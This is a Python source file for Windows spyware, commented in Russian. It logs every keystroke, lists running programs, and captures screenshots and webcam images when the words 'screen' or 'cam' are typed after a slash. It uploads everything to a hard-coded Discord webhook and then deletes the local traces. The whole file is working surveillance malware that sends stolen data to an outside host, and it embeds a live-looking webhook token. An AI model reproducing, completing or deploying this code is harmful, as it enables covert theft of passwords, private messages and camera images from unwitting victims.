import os
import time
import threading
import ctypes
import requests
from datetime import datetime
from PIL import ImageGrab  # Для создания скриншотов
import cv2  # Для снятия снимков с веб-камеры
import psutil
import uuid  # Для генерации случайных имен директорий и файлов

# URL вашего вебхука Discord
webhook_url = "https://discord.com/api/webhooks/1365021475509375049/7e5ePItKoWC1ZmiT1iYlNop6r0BUH5mjlr4uNhV2UTV4TipZQvIavwnVe9JXZdukTmLR"

# Функция для отправки файла через webhook
def send_webhook(file_path):
    try:
        with open(file_path, "rb") as f:
            files = {"file": f}
            response = requests.post(webhook_url, files=files)
            if response.status_code == 204:
                print(f"File {os.path.basename(file_path)} sent successfully.")
            else:
                print(f"Failed to send file. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"An error occurred: {e}")

# Функция для захвата клавиш
def log_keys():
    keys = []
    while True:
        for i in range(8, 190):
            if ctypes.windll.user32.GetAsyncKeyState(i) & 0x8000:
                if i == 0x0D:  # Enter
                    keys.append("\n")
                elif i == 0x20:  # Space
                    keys.append(" ")
                elif i == 0x08:  # Backspace
                    keys.append("[BACKSPACE]")
                elif i == 0x2F:  # Slash (/)
                    keys.append("/")
                    command = ""
                    while True:
                        event = ctypes.windll.user32.GetAsyncKeyState(0x20) & 0x8000  # Space
                        if event:
                            break
                        event = ctypes.windll.user32.GetAsyncKeyState(0x0D) & 0x8000  # Enter
                        if event:
                            break
                        event = ctypes.windll.user32.GetAsyncKeyState(0x08) & 0x8000  # Backspace
                        if event:
                            command = command[:-1]
                        for j in range(8, 190):
                            if ctypes.windll.user32.GetAsyncKeyState(j) & 0x8000:
                                if j >= 65 and j <= 90:  # A-Z
                                    command += chr(j + 32)  # Переводим в нижний регистр
                                elif j >= 48 and j <= 57:  # 0-9
                                    command += chr(j)
                                else:
                                    command += f"[{j}]"
                                break
                        time.sleep(0.1)
                    if command == "screen":
                        take_screenshot_and_send()
                    elif command == "cam":
                        take_webcam_snapshot_and_send()
                elif i >= 65 and i <= 90:  # A-Z
                    keys.append(chr(i + 32))  # Переводим в нижний регистр
                elif i >= 48 and i <= 57:  # 0-9
                    keys.append(chr(i))
                else:
                    keys.append(f"[{i}]")
        
        if keys:
            # Создаем временную директорию с случайным именем
            temp_dir = os.path.join(r"C:\Program Files", str(uuid.uuid4()))
            try:
                os.makedirs(temp_dir)
            except PermissionError:
                print("Permission denied: Unable to create directory in Program Files. Try running as administrator.")
                return
            
            # Создаем временный файл для логов
            log_file_path = os.path.join(temp_dir, f"{uuid.uuid4()}.txt")
            with open(log_file_path, "a") as f:
                f.write("".join(keys))
            
            # Отправляем файл через webhook
            send_webhook(log_file_path)
            
            # Удаляем временный файл и директорию
            try:
                os.remove(log_file_path)
                os.rmdir(temp_dir)
                print("Logs sent and temporary directory deleted.")
            except Exception as e:
                print(f"An error occurred while deleting files: {e}")
            
            keys.clear()
        time.sleep(0.1)

# Функция для получения списка открытых приложений
def get_open_applications():
    apps = []
    for proc in psutil.process_iter(['name']):
        try:
            apps.append(proc.info['name'])
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return "\n".join(apps)

# Функция для отправки логов каждые 10 секунд
def send_logs():
    while True:
        time.sleep(10)  # Отправляем информацию каждые 10 секунд
        # Создаем временную директорию с случайным именем
        temp_dir = os.path.join(r"C:\Program Files", str(uuid.uuid4()))
        try:
            os.makedirs(temp_dir)
        except PermissionError:
            print("Permission denied: Unable to create directory in Program Files. Try running as administrator.")
            return
        
        # Создаем временный файл для логов
        log_file_path = os.path.join(temp_dir, f"{uuid.uuid4()}.txt")
        if os.path.exists(log_file_path):
            with open(log_file_path, "r") as f:
                keys_content = f.read()
            open_apps = get_open_applications()
            
            # Создаем временный файл для отправки
            temp_log_file_path = os.path.join(temp_dir, f"{uuid.uuid4()}.txt")
            with open(temp_log_file_path, "w") as f:
                f.write(f"✧*̥˚ logs *̥˚✧\nНажатые клавиши:\n{keys_content}\n\nОткрытые приложения:\n{open_apps}")
            
            # Отправляем файл через webhook
            send_webhook(temp_log_file_path)
            
            # Удаляем временный файл и директорию
            try:
                os.remove(temp_log_file_path)
                os.rmdir(temp_dir)
                print("Logs sent and temporary directory deleted.")
            except Exception as e:
                print(f"An error occurred while deleting files: {e}")

# Функция для создания скриншота
def take_screenshot_and_send():
    # Создаем временную директорию с случайным именем
    temp_dir = os.path.join(r"C:\Program Files", str(uuid.uuid4()))
    try:
        os.makedirs(temp_dir)
    except PermissionError:
        print("Permission denied: Unable to create directory in Program Files. Try running as administrator.")
        return
    
    screenshot_path = os.path.join(temp_dir, f"{uuid.uuid4()}.png")
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        send_webhook(screenshot_path)
        os.remove(screenshot_path)
        os.rmdir(temp_dir)
        print("Screenshot sent and temporary directory deleted.")
    except Exception as e:
        print(f"An error occurred while taking screenshot: {e}")

# Функция для создания снимка с веб-камеры
def take_webcam_snapshot_and_send():
    # Создаем временную директорию с случайным именем
    temp_dir = os.path.join(r"C:\Program Files", str(uuid.uuid4()))
    try:
        os.makedirs(temp_dir)
    except PermissionError:
        print("Permission denied: Unable to create directory in Program Files. Try running as administrator.")
        return
    
    snapshot_path = os.path.join(temp_dir, f"{uuid.uuid4()}.png")
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("No video devices found.")
        return
    ret, frame = cap.read()
    cap.release()
    if ret:
        try:
            cv2.imwrite(snapshot_path, frame)
            send_webhook(snapshot_path)
            os.remove(snapshot_path)
            os.rmdir(temp_dir)
            print("Webcam snapshot sent and temporary directory deleted.")
        except Exception as e:
            print(f"An error occurred while taking webcam snapshot: {e}")
    else:
        print("Failed to capture webcam frame.")

if __name__ == "__main__":
    # Убедимся, что модули установлены
    try:
        import psutil
        import requests
        from PIL import ImageGrab
        import cv2
        import uuid
    except ImportError as e:
        print(f"Missing module: {e}")
        print("Please install the required modules using pip:")
        print("pip install psutil requests pillow opencv-python")
        exit(1)

    # Проверка URL вебхука
    if not webhook_url.startswith("https://discord.com/api/webhooks/"):
        print("Invalid webhook URL. Please check your webhook URL.")
        exit(1)

    # Запускаем потоки для захвата клавиш и отправки логов
    key_thread = threading.Thread(target=log_keys)
    log_thread = threading.Thread(target=send_logs)

    key_thread.start()
    log_thread.start()

    key_thread.join()
    log_thread.join()